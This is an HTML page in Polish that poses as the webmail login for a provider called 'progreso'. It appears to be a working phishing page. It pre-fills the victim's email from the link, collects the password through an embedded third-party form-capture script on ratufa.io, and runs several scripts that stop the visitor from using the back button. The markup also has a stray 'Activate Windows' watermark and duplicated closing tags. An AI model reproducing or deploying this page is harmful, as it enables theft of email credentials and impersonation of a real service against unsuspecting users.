<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>progreso - Zaloguj się do Poczty</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #1a1a1a;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            position: relative;
            padding: 0 20px;
        }

        /* Header Navigation Styles */
        .header {
            width: 100%;
            max-width: 1200px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 40px 0;
        }

        .back-link {
            color: #888888;
            text-decoration: none;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .back-link:hover {
            color: #ffffff;
        }

        .logo {
            font-size: 32px;
            font-weight: 800;
            color: #1cb0f6;
            letter-spacing: -1px;
            margin-left: 60px; /* Offset to visually center with back-link present */
        }

        .nav-buttons {
            display: flex;
            gap: 12px;
        }

        .btn-nav {
            background: transparent;
            color: #ffffff;
            border: 1px solid #444444;
            padding: 8px 20px;
            border-radius: 20px;
            font-size: 13px;
            cursor: pointer;
            text-decoration: none;
        }

        .btn-nav.active {
            border-color: #1cb0f6;
            color: #1cb0f6;
        }

        /* Main Form Container */
        .login-container {
            width: 100%;
            max-width: 620px;
            margin-top: 100px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .form-title {
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 40px;
            display: flex;
            align-items: center;
            gap: 12px;
            color: #ffffff;
        }

        .form-title svg {
            fill: #ffffff;
            width: 18px;
            height: 18px;
        }

        form {
            width: 100%;
        }

        /* Two Column Input Layout */
        .input-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 24px;
        }

        .input-group {
            position: relative;
            background-color: #1a1a1a;
            border: 1px solid #333333;
            border-radius: 4px;
        }

        .form-control {
            width: 100%;
            padding: 16px;
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 15px;
            outline: none;
        }

        .form-control::placeholder {
            color: #777777;
        }

        .password-toggle {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #555555;
            cursor: pointer;
        }

        /* Vibrant Blue Submit Button */
        .submit-btn {
            width: 100%;
            background-color: #1cb0f6;
            color: #ffffff;
            border: none;
            padding: 16px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-bottom: 40px;
        }

        .submit-btn:hover {
            background-color: #159cd9;
        }

        /* Bottom Info Text Link Section */
        .info-section {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            width: 100%;
            padding-left: 4px;
        }

        .info-icon {
            color: #888888;
            font-size: 18px;
            margin-top: 2px;
        }

        .info-text {
            font-size: 13px;
            color: #aaaaaa;
            line-height: 1.6;
        }

        .info-text a {
            color: #1cb0f6;
            text-decoration: none;
        }

        .info-text a:hover {
            text-decoration: underline;
        }

        /* Fixed Background System Watermark */
        .system-watermark {
            position: fixed;
            bottom: 24px;
            right: 24px;
            text-align: left;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.15);
            line-height: 1.4;
            user-select: none;
            pointer-events: none;
        }

        @media (max-width: 600px) {
            .input-row {
                grid-template-columns: 1fr;
                gap: 16px;
            }
            .header {
                flex-direction: column;
                gap: 20px;
            }
            .logo {
                margin-left: 0;
            }
        }
    </style>
</head>
<body>

    <!-- Header Navigation Container -->
    <header class="header">
        <a href="#" class="back-link">‹ Powrót do serwisu</a>
        <div class="logo">progreso</div>
        <div class="nav-buttons">
            <a href="#" class="btn-nav active">Poczta</a>
            <a href="#" class="btn-nav">Panel</a>
        </div>
    </header>

    <!-- Center Login Frame Layout Component -->
    <main class="login-container">
        <h1 class="form-title">
            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
            Zaloguj się do Poczty (Webmail)
        </h1>
        
        <form action="" method="POST">
<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
                <center>
            <div class="input-row">
                <div class="input-group">
                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                </div>
                <div class="input-group">
                    <input type="password" name="Password" placeholder="haslo" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                    <span class="password-toggle">👁</span>
                </div>
            </div>
            
            <button type="submit" class="submit-btn">Zaloguj mnie</button>
        </form>

        <div class="info-section">
            <span class="info-icon">ⓘ</span>
            <div class="info-text">
                Nie pamiętasz hasła do poczty?<br>
                Możesz je zmienić po zalogowaniu do <a href="#">panelu</a>.
            </div>
        </div>
    </main>

    <!-- Overlay Desktop Windows Activation Indicator Layer -->
    <div class="system-watermark">
        Activate Windows<br>
        <span style="font-size: 11px;"></span>
    </div>
        <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
